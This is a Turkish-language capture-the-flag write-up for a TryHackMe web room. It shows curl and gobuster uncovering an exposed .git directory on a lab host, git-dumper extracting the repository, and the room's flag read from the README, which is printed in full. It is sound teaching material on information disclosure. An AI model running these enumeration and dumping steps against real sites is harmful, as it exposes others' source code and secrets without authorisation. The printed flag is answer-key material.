> TryHackMe · Hacker Holidays 2026 · Very Easy · Web / Directory Enumeration
{: .prompt-info }

Staging ortamında unutulmuş bir `.git` dizininin canlıya sızmasıyla, tüm depo geçmişinin çekilip commit içindeki bir `README.md`'de bırakılan flag'in bulunduğu kısa ve klasik bir bilgi ifşası zafiyeti.

| Hedef | Kategori |
|---|---|
| 10.82.137.91:8080 | Web / Directory Enumeration |

**Zincir:** Nmap Recon → `gobuster` ile `.git/HEAD` (200) tespiti → `git-dumper` ile tüm deponun dump edilmesi → `README.md`'de bırakılmış flag

## 01 — Keşif

```console
$ curl -s http://10.82.137.91:8080/ | head -50
...
<footer>
  <span>BYTE LOTUS HOSPITALITY GROUP</span>
  <span>guest experience platform · build staging</span>
</footer>
```

Footer'daki "build staging" ifadesi, ortamda dev/staging'e ait artefaktların kalmış olabileceğine işaret ediyordu. Dizin taramasında `.git/HEAD` doğrudan erişilebilir çıktı:

```console
$ gobuster dir -u http://10.82.137.91:8080 -w /usr/share/wordlists/dirb/common.txt -x php,txt,zip,bak,git,json,env -t 50
.git/HEAD            (Status: 200) [Size: 21]
```

## 02 — Deponun dump edilmesi

`.git/` dizininin doğrudan web üzerinden servis edilmesi, standart bir HTTP istemcisiyle (özel bir araç olmadan da) tüm git objelerinin tek tek indirilip yerelde bir repo'ya dönüştürülebileceği anlamına gelir. `git-dumper` bu süreci otomatikleştirir:

```console
$ pipx install git-dumper
$ git-dumper http://10.82.137.91:8080/.git/ ~/room404_git
[-] Testing http://10.82.137.91:8080/.git/HEAD [200]
[-] Fetching .git recursively
...
[-] Running git checkout .
Updated 3 paths from the index
```

## 03 — Kaynak kodun incelenmesi

```console
$ cd ~/room404_git && ls -la
app.js  index.html  README.md

$ git log --oneline --all
0f13550 (HEAD -> main) initial Byte Lotus guest platform

$ cat README.md
# Byte Lotus — Guest Experience Platform

Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.

Staging flag (remove before launch): THM{byt3_l0tus_n3v3r_f0rg3ts}
```

> ✅ flag doğrudan `README.md` içinde, "remove before launch" notuyla birlikte kalmış
{: .prompt-tip }

## Özet — Öğrenilen teknikler

- Web köküne yanlışlıkla deploy edilen bir `.git` dizini, tek bir dosyaya (`.git/HEAD`'e 200 dönmesi) bakarak fark edilebilir ve `git-dumper`/GitTools gibi araçlarla tüm commit geçmişiyle birlikte dışarı çekilebilir.
- Sadece mevcut dosyalara değil, **commit geçmişine** de bakmak gerekir — bazı senaryolarda hassas bilgi sonradan silinmiş ama eski bir commit'te hâlâ erişilebilir durumda kalmış olabilir.
- "Staging'de kalmış, production'a gitmeyecek" notlarının (README'deki "remove before launch" gibi) genellikle tam da böyle unutulup canlıya sızdığı.
